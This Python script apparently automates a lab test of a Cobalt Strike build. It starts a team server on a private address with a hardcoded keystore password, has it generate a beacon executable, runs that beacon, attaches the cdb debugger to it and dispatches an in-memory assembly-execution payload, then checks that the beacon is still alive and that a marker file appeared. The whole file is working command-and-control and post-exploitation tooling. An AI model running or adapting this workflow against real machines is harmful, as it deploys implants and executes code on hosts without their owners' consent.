# -*- coding: utf-8 -*-
"""iea_cycle2.py - deploy beacon first, then bash-style cdb attach (nohup
/dev/null pattern that survived previous runs), then dispatch iea."""
import os
import re
import subprocess
import sys
import time

P3 = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench"
TSBOOT = P3 + r"\tsboot_run"
LOG = TSBOOT + r"\r1.log"
JDK = r"C:\Users\Administrator\Desktop\jdk-21.0.12.1\bin"
JAR = P3 + r"\build\libs\cs-gradle-4.9.1-SNAPSHOT-all.jar"
OUT = open(r"C:\Users\Public\iea_cycle.log", "w", encoding="utf-8")


def log(m):
    OUT.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), m))
    OUT.flush()


def main():
    subprocess.run(["powershell", "-NoProfile", "-Command",
                    'Get-CimInstance Win32_Process | Where-Object { $_.Name -match "java.exe|javaw.exe|franken_b1.exe|cdb" } | '
                    'ForEach-Object { Stop-Process -Id $_.ProcessId -Force }'], capture_output=True)
    time.sleep(5)
    for f in (TSBOOT + r"\r1_inbox.txt", TSBOOT + r"\r1_ack.txt"):
        if os.path.exists(f):
            os.remove(f)

    subprocess.Popen([JDK + r"\java.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx2g", "-XX:+AggressiveHeap", "-XX:+UseParallelGC",
                      "-Djavax.net.ssl.keyStore=cobaltstrike.store",
                      "-Djavax.net.ssl.keyStorePassword=123456",
                      "-cp", JAR, "server.TeamServer", "192.168.100.200", "franken", "r2_inj_tpd.profile"],
                     cwd=TSBOOT)
    time.sleep(14)
    subprocess.Popen([JDK + r"\javaw.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx512m", "-cp", JAR,
                      "aggressor.headless.Start", "192.168.100.200", "50050", "franken-opIEA", "franken",
                      "headless_franken.cna"],
                     cwd=TSBOOT)
    t0 = time.time()
    while time.time() - t0 < 120:
        if os.path.exists(LOG):
            if "READY" in open(LOG, encoding="utf-8", errors="replace").read()[-500:]:
                break
        time.sleep(3)
    log("TS ready")

    sys.path.insert(0, TSBOOT)
    from tier3_common import send

    exe = r"C:\Users\Public\franken_b1.exe"
    if os.path.exists(exe):
        os.remove(exe)
    seen = set(re.findall(r"INITIAL\t(\d+)", open(LOG, encoding="utf-8", errors="replace").read()))
    send("artifact", "vnc-http", "exe", "x64", exe.replace("\\", "/"))
    while not (os.path.exists(exe) and os.path.getsize(exe) > 300000):
        time.sleep(2)
    log("exe ready")
    subprocess.Popen([exe], cwd=r"C:\Users\Public",
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    bid = None
    deadline = time.time() + 180
    while time.time() < deadline:
        m = re.findall(r"INITIAL\t(\d+)", open(LOG, encoding="utf-8", errors="replace").read())
        new = [x for x in m if x not in seen]
        if new:
            bid = new[-1]
            break
        time.sleep(5)
    log("beacon bid: %s" % (bid or "NONE"))
    if not bid:
        return

    # beacon pid for cdb attach
    pid = None
    t0 = time.time()
    while time.time() - t0 < 20 and not pid:
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
                            "(Get-Process franken_b1 -ErrorAction SilentlyContinue).Id"],
                           capture_output=True, text=True)
        pid = r.stdout.strip()
        if pid and not pid.isdigit():
            pid = None
        time.sleep(2)
    log("beacon pid: %s" % pid)
    if not pid:
        return

    # bash nohup pattern: stdin /dev/null, output to log
    cmd = ('cd /c/Users/Public && rm -f cdb_iea3.log && "/c/Users/Administrator/AppData/Local/'
           'Microsoft/WindowsApps/cdbX64.exe" -p ' + pid + ' -lines -c "'
           'bp ole32!CLRCreateInstance \\".echo ===CLR-CREATE-HIT===; k 12; g\\"; g" '
           '> cdb_iea3.log 2>&1 &')
    subprocess.run(["bash", "-c", cmd], capture_output=True)
    log("cdb attached (async)")
    time.sleep(15)
    send("iea", "C:/Users/Public/iea.x64.o", "C:/Users/Public/TestAssembly.exe", "IEA-TEST-OK")
    log("iea dispatched")
    time.sleep(80)
    seg = open(LOG, encoding="utf-8", errors="replace").read()
    log("beacon alive after: %s" % ("HEART\t" + bid + "\talive=true" in seg[-3000:]))
    log("file marker: %s" % os.path.exists(r"C:\Users\Public\iea_ran.txt"))


if __name__ == "__main__":
    try:
        main()
    finally:
        OUT.close()
